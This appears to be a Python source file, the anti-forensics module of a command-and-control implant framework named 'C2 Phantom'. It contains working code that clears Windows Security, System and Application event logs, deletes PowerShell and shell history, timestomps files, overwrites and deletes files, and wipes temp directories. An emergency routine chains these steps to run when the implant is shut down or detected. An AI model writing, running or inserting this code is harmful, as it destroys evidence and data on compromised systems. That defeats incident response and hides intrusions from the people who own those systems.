"""
Anti-forensics module for C2 Phantom.
Log wiping, timestomping, secure deletion, self-destruct.
"""

import logging
import platform
import os
import subprocess
import shutil
from pathlib import Path
from datetime import datetime
from typing import Optional

logger = logging.getLogger(__name__)


class LogWiper:
    """Log wiping utilities."""

    @staticmethod
    def clear_windows_event_logs(log_name: Optional[str] = None) -> bool:
        """
        Clear Windows Event Logs using wevtutil.
        """
        if platform.system() != "Windows":
            return False

        try:
            logs_to_clear = [log_name] if log_name else ["System", "Security", "Application"]

            for log in logs_to_clear:
                try:
                    subprocess.run(
                        ["wevtutil.exe", "cl", log], check=True, capture_output=True, creationflags=0x08000000
                    )
                    logger.info(f"[FORENSICS] Cleared Windows Event Log: {log}")
                except subprocess.CalledProcessError as e:
                    logger.warning(f"[FORENSICS] Failed to clear {log}: {e}")

            return True
        except Exception as e:
            logger.error(f"[FORENSICS] Event log clearing failed: {e}")
            return False

    @staticmethod
    def clear_powershell_history() -> bool:
        """Clear PowerShell command history."""
        if platform.system() != "Windows":
            return False

        try:
            # Clear PSReadLine history
            ps_history_path = (
                Path(os.environ.get("APPDATA", ""))
                / "Microsoft"
                / "Windows"
                / "PowerShell"
                / "PSReadLine"
                / "ConsoleHost_history.txt"
            )

            if ps_history_path.exists():
                ps_history_path.unlink()
                logger.info("[FORENSICS] PowerShell history cleared")

            return True
        except Exception as e:
            logger.error(f"[FORENSICS] PowerShell history clearing failed: {e}")
            return False

    @staticmethod
    def clear_bash_history() -> bool:
        """Clear Bash history."""
        if platform.system() == "Windows":
            return False

        try:
            history_files = [Path.home() / ".bash_history", Path.home() / ".zsh_history"]

            for hist_file in history_files:
                if hist_file.exists():
                    hist_file.unlink()
                    logger.info(f"[FORENSICS] Cleared: {hist_file}")

            # Clear in-memory history
            os.environ["HISTFILE"] = "/dev/null"
            return True
        except Exception as e:
            logger.error(f"[FORENSICS] Bash history clearing failed: {e}")
            return False


class Timestomper:
    """MACE timestamp manipulation."""

    @staticmethod
    def set_file_times(file_path: str, timestamp: datetime) -> bool:
        """
        Set file MACE timestamps (Modified, Accessed, Created, Entry).
        """
        try:
            path = Path(file_path)
            if not path.exists():
                return False

            # Set modification and access times
            timestamp_epoch = timestamp.timestamp()
            os.utime(file_path, (timestamp_epoch, timestamp_epoch))

            logger.info(f"[FORENSICS] Timestomped: {file_path}")
            return True
        except Exception as e:
            logger.error(f"[FORENSICS] Timestomping failed: {e}")
            return False

    @staticmethod
    def match_timestamps(source_file: str, target_file: str) -> bool:
        """Match timestamps from source file to target file."""
        try:
            source_stat = Path(source_file).stat()
            target_path = Path(target_file)

            os.utime(target_file, (source_stat.st_atime, source_stat.st_mtime))

            logger.info(f"[FORENSICS] Matched timestamps: {source_file} -> {target_file}")
            return True
        except Exception as e:
            logger.error(f"[FORENSICS] Timestamp matching failed: {e}")
            return False


class ArtifactCleaner:
    """Artifact cleaning utilities."""

    @staticmethod
    def secure_delete(file_path: str, passes: int = 3) -> bool:
        """
        Secure file deletion with multi-pass overwrite.
        Overwrites file data before deletion.
        """
        try:
            path = Path(file_path)
            if not path.exists():
                return False

            file_size = path.stat().st_size

            # Multi-pass overwrite
            with open(file_path, "ba+", buffering=0) as f:
                for pass_num in range(passes):
                    f.seek(0)
                    if pass_num == 0:
                        f.write(b"\xff" * file_size)  # All 1s
                    elif pass_num == 1:
                        f.write(b"\x00" * file_size)  # All 0s
                    else:
                        f.write(os.urandom(file_size))  # Random

            # Delete file
            path.unlink()
            logger.info(f"[FORENSICS] Securely deleted: {file_path}")
            return True
        except Exception as e:
            logger.error(f"[FORENSICS] Secure deletion failed: {e}")
            return False

    @staticmethod
    def clear_temp_files() -> bool:
        """Clear temporary files."""
        try:
            if platform.system() == "Windows":
                temp_dirs = [
                    Path(os.environ.get("TEMP", "")),
                    Path(os.environ.get("TMP", "")),
                    Path("C:\\Windows\\Temp"),
                ]
            else:
                temp_dirs = [Path("/tmp")]

            for temp_dir in temp_dirs:
                if temp_dir.exists():
                    for item in temp_dir.iterdir():
                        try:
                            if item.is_file():
                                item.unlink()
                            elif item.is_dir():
                                shutil.rmtree(item, ignore_errors=True)
                        except Exception:
                            pass

            logger.info("[FORENSICS] Temp files cleared")
            return True
        except Exception as e:
            logger.error(f"[FORENSICS] Temp file clearing failed: {e}")
            return False

    @staticmethod
    def clear_registry_artifacts() -> bool:
        """Clear Windows Registry artifacts."""
        if platform.system() != "Windows":
            return False

        try:
            import winreg

            # Registry paths to clean
            reg_paths = [
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"),
                (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"),
            ]

            for hive, path in reg_paths:
                try:
                    key = winreg.OpenKey(hive, path, 0, winreg.KEY_WRITE)
                    # Would delete specific values here
                    winreg.CloseKey(key)
                except WindowsError:
                    pass

            logger.info("[FORENSICS] Registry artifacts cleared")
            return True
        except Exception as e:
            logger.error(f"[FORENSICS] Registry cleaning failed: {e}")
            return False


class SelfDestruct:
    """Self-destruct and cleanup mechanisms."""

    @staticmethod
    def emergency_cleanup() -> None:
        """
        Emergency cleanup of all artifacts.
        Called on agent shutdown or detection.
        """
        logger.critical("[FORENSICS] Emergency cleanup initiated")

        try:
            # Clear logs
            if platform.system() == "Windows":
                LogWiper.clear_windows_event_logs()
                LogWiper.clear_powershell_history()
            else:
                LogWiper.clear_bash_history()

            # Clear temp files
            ArtifactCleaner.clear_temp_files()

            # Clear registry
            if platform.system() == "Windows":
                ArtifactCleaner.clear_registry_artifacts()

            logger.critical("[FORENSICS] Emergency cleanup completed")
        except Exception as e:
            logger.error(f"[FORENSICS] Emergency cleanup failed: {e}")

    @staticmethod
    def dead_mans_switch(max_silence_hours: int = 24) -> None:
        """
        Dead man's switch - auto-cleanup if no C2 contact.
        Would be implemented with threading/async timer in real usage.
        """
        logger.info(f"[FORENSICS] Dead man's switch armed ({max_silence_hours}h)")
        # Implementation would track last C2 contact and trigger cleanup
